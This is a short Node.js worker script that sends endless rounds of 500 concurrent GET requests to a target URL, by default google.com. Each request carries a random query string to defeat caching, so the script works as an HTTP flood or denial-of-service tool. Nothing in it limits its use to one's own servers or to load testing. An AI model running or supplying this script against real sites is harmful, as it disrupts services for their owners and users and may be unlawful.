let {parentPort, workerData} = require('worker_threads');
const axios = require('axios');
const { url } = require('inspector');
const browser = axios.create({
    headers: {
        'User-Agent': process.env.USER_AGENT ?? 'Axios Client: 1.1.3',
    }
});

workerData = workerData ?? {
    url: 'https://www.google.com/',
    concurrency: 500,
};

parentPort = parentPort ?? {
    postMessage: console.log.bind(console, 'MESSAGE')
};

(async () => {
    while(true) {
        try {
            const promises = [];
            for(let i = 0; i < workerData.concurrency; i++) {
                promises.push(browser.get(`${workerData.url}?_ts=${Math.random().toString(36).substring(2, 5)}`).catch((err) => parentPort?.postMessage(err)));
            }
            parentPort?.postMessage(`Firing ${workerData.concurrency} requests to ${workerData.url} ...`);
            await Promise.allSettled(promises);
            parentPort?.postMessage(`Completed ${workerData.concurrency} requests to ${workerData.url} ...`);
        } catch(err) {
            parentPort?.postMessage(`ERROR ${err}`);
            break;
        }
    }
})().catch((err) => parentPort?.postMessage(err));